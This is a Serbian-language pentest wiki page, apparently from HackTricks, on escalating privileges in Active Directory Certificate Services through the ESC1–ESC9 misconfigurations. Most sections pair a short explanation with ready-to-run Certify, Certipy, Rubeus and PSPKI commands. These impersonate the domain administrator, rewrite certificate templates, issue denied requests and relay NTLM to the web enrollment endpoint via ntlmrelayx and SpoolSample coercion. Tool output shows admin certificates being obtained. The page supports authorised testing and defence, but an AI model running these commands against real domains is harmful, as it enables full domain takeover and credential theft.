# AD CS eskalacija domena

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak sekcija o tehnikama eskalacije iz postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisanih predložaka sertifikata - ESC1

### Objašnjenje

### Objašnjenje Pogrešno konfigurisanih predložaka sertifikata - ESC1

- **Prava za enrolment su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.**
- **Odobrenje menadžera nije potrebno.**
- **Potpisi ovlašćenog osoblja nisu potrebni.**
- **Bezbednosni deskriptori na predlošcima sertifikata su previše permisivni, što omogućava korisnicima sa niskim privilegijama da dobiju prava za enrolment.**
- **Predlošci sertifikata su konfigurisanI tako da definišu EKU-e koji omogućavaju autentikaciju:**
- Extended Key Usage (EKU) identifikatori kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ili bez EKU (SubCA) su uključeni.
- **Predložak dozvoljava zahtevateljima da uključe subjectAltName u Certificate Signing Request (CSR):**
- Active Directory (AD) daje prioritet subjectAltName (SAN) u sertifikatu za verifikaciju identiteta ako je prisutan. To znači da specificiranjem SAN u CSR-u, sertifikat može biti zatražen da se impersonira bilo koji korisnik (npr. domain administrator). Da li zahtevatelj može da specificira SAN naznačeno je u AD objektu predloška sertifikata kroz `mspki-certificate-name-flag` svojstvo. Ovo svojstvo je bitmask, i prisustvo `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag-a dopušta specificiranje SAN-a od strane zahtevatelja.

> [!CAUTION]
> Konfiguracija opisna iznad omogućava korisnicima sa niskim privilegijama da zatraže sertifikate sa bilo kojim izabranim SAN-om, omogućavajući autentikaciju kao bilo koji domenčki principal putem Kerberos ili SChannel.

Ova opcija je ponekad omogućena da bi se podržala dinamička generacija HTTPS ili host sertifikata od strane proizvoda ili deployment servisa, ili zbog nedostatka razumevanja.

Primećeno je da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći predložak sertifikata (poput `WebServer` predloška, koji ima `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućeno) duplicira i zatim izmeni da uključi authentication OID.

### Zloupotreba

Da biste **pronašli ranjive predloške sertifikata** možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da biste **zloupotrebili ovu ranjivost i lažno se predstavili kao administrator**, možete pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete pretvoriti generisani **sertifikat u `.pfx`** format i ponovo ga koristiti za **autentifikaciju koristeći Rubeus ili certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi "Certreq.exe" & "Certutil.exe" mogu se koristiti za generisanje PFX fajla: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija šablona sertifikata unutar konfiguracione šeme AD Foresta, tačnije onih koji ne zahtevaju odobrenje ili potpise, koji poseduju Client Authentication ili Smart Card Logon EKU, i kojima je omogućena zastavica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisanji šabloni sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe je varijacija prvog:

1. Prava za enrollment su dodeljena niskoprivilegovanim korisnicima od strane Enterprise CA.
2. Zahtev za odobrenjem menadžera je onemogućen.
3. Zahtev za ovlašćenim potpisima je izostavljen.
4. Preterano permisivan security descriptor na šablonu sertifikata dodeljuje prava za enrollment sertifikata niskoprivilegovanim korisnicima.
5. **Šablon sertifikata je definisan da uključuje Any Purpose EKU ili nema EKU.**

The **Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju namenu**, uključujući client authentication, server authentication, code signing itd. Ista **technique used for ESC3** može se upotrebiti za eksploataciju ovog scenarija.

Sertifikati sa **no EKUs**, koji funkcionišu kao subordinate CA certificates, mogu se iskoristiti za **bilo koju namenu** i **takođe se mogu koristiti za potpisivanje novih sertifikata**. Dakle, napadač bi mogao da navede proizvoljne EKU-e ili polja u novim sertifikatima koristeći subordinate CA certificate.

Međutim, novi sertifikati kreirani za **domain authentication** neće raditi ako subordinate CA nije verifikovan od strane objekta **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojom EKU** i proizvoljnim vrednostima sertifikata. To bi se potencijalno moglo **zloupotrebiti** u širokom spektru namena (npr. code signing, server authentication itd.) i može imati značajne posledice za druge aplikacije u mreži kao što su SAML, AD FS ili IPSec.

Da bi se izlistali šabloni koji odgovaraju ovom scenariju unutar konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani Enrolment Agent Templates - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugi EKU** (Certificate Request Agent) i **2 različita šablona** (stoga ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava subjektu da **zatraži** **sertifikat** u **ime drugog korisnika**.

**„enrollment agent”** se upisuje u takav **šablon** i koristi dobijeni **sertifikat da ko-potpíše CSR u ime drugog korisnika**. Zatim **šalje** **ko-potpisani CSR** CA, upisujući se u **šablon** koji **dozvoljava „enroll on behalf of”**, i CA odgovara sa **sertifikatom koji pripada „drugom” korisniku**.

**Zahtevi 1:**

- Prava za enrollment su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.
- Zahtev za odobrenje menadžera je izostavljen.
- Nema zahteva za ovlašćenim potpisima.
- Bezbednosni deskriptor šablona sertifikata je previše permisivan, dodeljujući prava za enrollment korisnicima sa niskim privilegijama.
- Šablon sertifikata uključuje Certificate Request Agent EKU, omogućavajući zahtev za drugim šablonima sertifikata u ime drugih subjekata.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Verzija šeme šablona je ili 1 ili veća od 2, i specificira Application Policy Issuance Requirement koji zahteva Certificate Request Agent EKU.
- EKU definisan u šablonu sertifikata omogućava autentifikaciju u domenu.
- Ograničenja za enrollment agente nisu primenjena na CA.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za zloupotrebu ovog scenarija:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Korisnici koji imaju dozvolu da dobiju **enrollment agent certificate**, šablone u kojima su **enrollment agents** ovlašćeni da se prijave, i **nalozi** u čije ime enrollment agent može da deluje mogu biti ograničeni od strane enterprise CA-ova. Ovo se postiže otvaranjem `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, i zatim **navigating** do “Enrollment Agents” taba.

Međutim, primećeno je da je **default** podešavanje za CA-e “**Do not restrict enrollment agents**.” Kada administratori omoguće ograničenje na enrollment agents, postavljanjem na “Restrict enrollment agents,” podrazumevana konfiguracija ostaje izuzetno permisivna. Omogućava **Everyone** pristup da se prijavi na sve šablone kao bilo ko.

## Ranljiva kontrola pristupa šablonima sertifikata - ESC4

### **Objašnjenje**

Bezbednosni deskriptor na **certificate templates** definiše **permissions** koje određeni **AD principals** imaju u vezi sa šablonom.

Ako **attacker** poseduje neophodne **permissions** da **alter** **template** i **institute** bilo koje **exploitable misconfigurations** opisane u **prior sections**, to može omogućiti eskalaciju privilegija.

Značajne dozvole koje se primenjuju na šablone sertifikata uključuju:

- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
- **WriteProperty:** Authorizes the editing of any object properties.

### Zloupotreba

Da biste identifikovali principale sa pravima izmene na šablonima i drugim PKI objektima, enumerišite pomoću Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Primer privesc-a sličan prethodnom:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je kada korisnik ima write privilegije nad šablonom sertifikata. Ovo se, na primer, može zloupotrebiti da bi se prepisala konfiguracija šablona sertifikata i učinila ranjivom na ESC1.

Kao što vidimo u putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` ivicu prema `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Evo malog prikaza Certipy-ove `shadow auto` komande za dobijanje NT hasha žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može da prepiše konfiguraciju šablona sertifikata jednom komandom. **Podrazumevano**, Certipy će **prepisati** konfiguraciju da bi bila **ranjiva na ESC1**. Takođe možemo navesti **`-save-old` parametar za čuvanje stare konfiguracije**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Ranljiva kontrola pristupa PKI objekata - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih ACL-zasnovanih odnosa, koja uključuje više objekata izvan certificate templates i certificate authority, može uticati na bezbednost celog AD CS sistema. Ti objekti, koji značajno utiču na bezbednost, obuhvataju:

- AD computer object of the CA server, koji može biti kompromitovan putem mehanizama kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server of the CA server.
- Bilo koji descendant AD object ili container unutar specifične container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja uključuje, ali nije ograničena na, containere i objekte kao što su Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, i the Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se dotiče implikacija zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kako to navodi Microsoft. Kada je ova konfiguracija uključena na Certification Authority (CA), dozvoljava uključivanje **user-defined values** u **subject alternative name** za **any request**, uključujući one kreirane iz Active Directory®. Posledično, ovo omogućava napadaču da se enroll-uje kroz **any template** podešen za domen **authentication** — posebno one otvorene za enrollment neprivilegovanih korisnika, kao što je standardni User template. Kao rezultat, može se dobiti sertifikat koji omogućava napadaču da se autentifikuje kao domain administrator ili **any other active entity** unutar domena.

**Napomena**: Pristup dodavanju **alternative names** u a Certificate Signing Request (CSR), putem argumenta `-attrib "SAN:"` u `certreq.exe` (nazvanog “Name Value Pairs”), predstavlja kontrast u odnosu na strategiju eksploatacije SANs u ESC1. Ovde razlika leži u tome kako se informacije o nalogu enkapsuliraju — unutar certificate attribute, umesto kao extension.

### Zloupotreba

Da bi proverile da li je podešavanje aktivirano, organizacije mogu upotrebiti sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **remote registry access**, stoga, alternativni pristup može biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati kao [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu да открију ovu pogrešnu konfiguraciju и iskoriste je:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Da biste promenili ova podešavanja, pod pretpostavkom da posedujete **domain administrative** prava ili ekvivalent, sledeća komanda može biti izvršena sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u vašem okruženju, zastavica se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022, novo izdata **certificates** će sadržati **security extension** koji uključuje **requester's `objectSid` property**. Za ESC1, ovaj SID je izveden iz navedenog SAN-a. Međutim, za **ESC6**, SID odražava **requester's `objectSid`**, a ne SAN.\
> Da bi se iskoristio ESC6, bitno je da sistem bude podložan ESC10 (Weak Certificate Mappings), koji daje prednost **SAN over the new security extension**.

## Ranljiv Certificate Authority Access Control - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa za certificate authority održava se skupom dozvola koje upravljaju radnjama CA. Te dozvole se mogu pregledati otvaranjem `certsrv.msc`, desnim klikom na CA, izborom Properties, a zatim prelaskom na Security tab. Takođe, dozvole se mogu izbrojati korišćenjem PSPKI modula pomoću komandi kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
#### Zloupotreba

Posedovanje prava **`ManageCA`** nad sertifikacionom autoritetom omogućava entitetu da daljinski menja podešavanja koristeći PSPKI. To uključuje uključivanje/isključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`** da bi se dozvolilo navođenje SAN-a u bilo kojem šablonu, što je kritičan aspekt eskalacije domena.

Pojednostavljenje ovog procesa je izvodljivo upotrebom PSPKI-jevog cmdlet-a **Enable-PolicyModuleFlag**, što omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje čekajućih zahteva, efikasno zaobilazeći meru zaštite "CA certificate manager approval".

Kombinacija modula **Certify** i **PSPKI** može se koristiti za podnošenje zahteva, odobravanje i preuzimanje sertifikata:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> U **prethodnom napadu** **`Manage CA`** permissions su korišćene da **omoguće** zastavicu **EDITF_ATTRIBUTESUBJECTALTNAME2** kako bi se izveo **ESC6 attack**, ali to neće imati efekta dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pristupno pravo `Manage CA`, korisniku je takođe dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može restartovati servis na daljinu**. Nadalje, E**SC6 možda neće raditi odmah** u većini zakrpanih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zbog toga se ovde prikazuje drugi napad.

Perquisites:

- Samo **`ManageCA` permission**
- **`Manage Certificates`** permission (može se dodeliti iz **`ManageCA`**)
- Šablon sertifikata **`SubCA`** mora biti **enabled** (može se enabled iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pristupnim pravima `Manage CA` _i_ `Manage Certificates` mogu **kreirati neuspešne zahteve za sertifikat**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali **samo administratori** mogu da se upišu koristeći taj šablon. Dakle, **korisnik** može **zatražiti** upis u **`SubCA`** - što će biti **odbijeno** - ali će ga potom **menadžer izdati naknadno**.

#### Abuse

Možete sebi dodeliti pristupno pravo **`Manage Certificates`** tako što ćete svog korisnika dodati kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Šablon **`SubCA`** može biti **omogućen na CA** korišćenjem parametra `-enable-template`. Podrazumevano, šablon `SubCA` je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi sa **zahtevanjem sertifikata zasnovanog na predlošku `SubCA`**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati private key i zabeležiti request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim **`Manage CA` i `Manage Certificates`**, možemo zatim izdati neuspešan zahtev za sertifikat pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na kraju, možemo da **preuzmemo izdat sertifikat** pomoću `req` komande i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Napad 3 – Manage Certificates Extension Abuse (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje pending zahteva), **Certify 2.0** je otkrio potpuno novu primitivu koja zahteva samo ulogu *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) na Enterprise CA.

Metod RPC `ICertAdmin::SetExtension` može da izvrši bilo koji principal koji poseduje *Manage Certificates*. Dok se metod tradicionalno koristio od strane legitimnih CA da ažurira ekstenzije na **pending** zahtevima, napadač ga može zloupotrebiti da **doda *non-default* certificate extension** (na primer custom *Certificate Issuance Policy* OID kao `1.1.1.1`) na zahtev koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA NEĆE prepisati vrednost koju kontroliše napadač kada zahtev bude konačno izdat. Rezultujući sertifikat stoga sadrži napadačem izabranu ekstenziju koja može:

* Zadovoljiti Application / Issuance Policy zahteve drugih ranjivih template-a (vodeći do eskalacije privilegija).
* Ubaciti dodatne EKU ili politike koje dodeljuju sertifikatu neočekivano poverenje u third-party sistemima.

Ukratko, *Manage Certificates* — ranije smatrana „manje moćnom“ polovicom ESC7 — sada se može iskoristiti za punu eskalaciju privilegija ili dugoročnu persistenciju, bez diranja CA konfiguracije ili potrebe za restriktivnijim pravom *Manage CA*.

#### Abuziranje primitive sa Certify 2.0

1. **Podnesite certificate request koji će ostati *pending*.** Ovo se može forsirati template-om koji zahteva manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dodajte custom ekstenziju na pending zahtev** koristeći novi `manage-ca` komand:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ako template već ne definiše *Certificate Issuance Policies* ekstenziju, vrednost iznad će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe ima odobrenja za *Manage Certificates*) ili sačekajte da operator odobri. Kada bude izdat, preuzmite sertifikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Rezultujući sertifikat sada sadrži maliciozni issuance-policy OID i može se koristiti u narednim napadima (npr. ESC13, domain escalation, itd.).

> NOTE:  Isti napad se može izvesti sa Certipy ≥ 4.7 preko `ca` komande i `-set-extension` parametra.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima gde je **AD CS instaliran**, ako postoji **vulnerable web enrollment endpoint** i bar jedan **certificate template je published** koji dozvoljava **domain computer enrollment i client authentication** (kao default **`Machine`** template), postaje moguće da **bilo koji računar sa aktivnim spooler servisom bude kompromitovan od strane napadača**!

AD CS podržava nekoliko **HTTP-based enrollment metoda**, dostupnih kroz dodatne server role koje administratori mogu instalirati. Ovi interfejsi za HTTP-based certificate enrollment su podložni **NTLM relay** napadima. Napadač, sa **kompromitovane mašine, može imitirati bilo koji AD nalog koji se autentifikuje putem inbound NTLM**. Dok se lažno predstavlja kao žrtva, ove web interfejse napadač može koristiti da **zahteva client authentication certificate koristeći `User` ili `Machine` certificate template-e**.

- **web enrollment interface** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`), podrazumevano radi samo preko HTTP, što ne pruža zaštitu protiv NTLM relay napada. Dodatno, eksplicitno dozvoljava samo NTLM autentikaciju kroz Authorization HTTP header, čineći sigurnije metode autentikacije kao Kerberos neprimenjivim.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate autentikaciju preko svog Authorization HTTP header-a. Negotiate autentikacija **podržava i** Kerberos i **NTLM**, što napadaču omogućava da tokom relay napada **downgrade-uje na NTLM**. Iako ovi web servisi po default-u omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita od NTLM relay napada za HTTPS servise je moguća samo kada je HTTPS kombinovan sa channel binding. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je potrebno za channel binding.

Uobičajen **problem** kod NTLM relay napada je **kratko trajanje NTLM sesija** i nemogućnost napadača da interaguje sa servisima koji **zahtevaju NTLM signing**.

Ipak, ovo ograničenje je prevaziđeno iskorišćavanjem NTLM relay napada da se pribavi sertifikat za korisnika, pošto period važenja sertifikata određuje trajanje sesije, i sertifikat se može koristiti sa servisima koji **zahtevaju NTLM signing**. Za instrukcije o korišćenju ukradenog sertifikata, pogledajte:


{{#ref}}
account-persistence.md
{{#endref}}

Joše jedno ograničenje NTLM relay napada je da **mašina pod kontrolom napadača mora biti autentifikovana od strane žrtvinog naloga**. Napadač može ili da sačeka ili pokuša da to autentifikovanje **forsira**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuziranje**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koristi se od strane enterprise Certificate Authorities (CAs) za čuvanje Certificate Enrollment Service (CES) krajnjih tačaka. Ove krajnje tačke mogu se parsirati i nabrojati korišćenjem alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba sa [Certipy](https://github.com/ly4k/Certipy)

Zahtjev za sertifikat Certipy podrazumevano pravi na osnovu template-a `Machine` ili `User`, što se određuje time da li ime naloga koje se prosleđuje završava sa `$`. Navođenje alternativnog template-a može se postići korišćenjem parametra `-template`.

Tehnika kao [PetitPotam](https://github.com/ly4k/PetitPotam) može se potom upotrebiti da prisili autentifikaciju. Kod domain controllera potrebno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Bez bezbednosnog proširenja - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Novi atribut **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, nazvan ESC9, sprečava ugradnju **nove `szOID_NTDS_CA_SECURITY_EXT` bezbednosne ekstenzije** u sertifikat. Ovaj flag postaje relevantan kada je `StrongCertificateBindingEnforcement` postavljen na `1` (podrazumevana vrednost), za razliku od podešavanja `2`. Njegova važnost se povećava u scenarijima gde bi slabije mapiranje sertifikata za Kerberos ili Schannel moglo biti iskorišćeno (kao u ESC10), s obzirom da odsustvo ESC9 ne bi promenilo zahteve.

Uslovi pod kojima podešavanje ovog flaga postaje značajno uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevano `1`), ili `CertificateMappingMethods` uključuje `UPN` flag.
- Sertifikat je označen `CT_FLAG_NO_SECURITY_EXTENSION` flagom u okviru podešavanja `msPKI-Enrollment-Flag`.
- Bilo koji client authentication EKU je naveden u sertifikatu.
- `GenericWrite` dozvole su dostupne nad bilo kojim nalogom za kompromitovanje drugog.

### Scenarij zloupotrebe

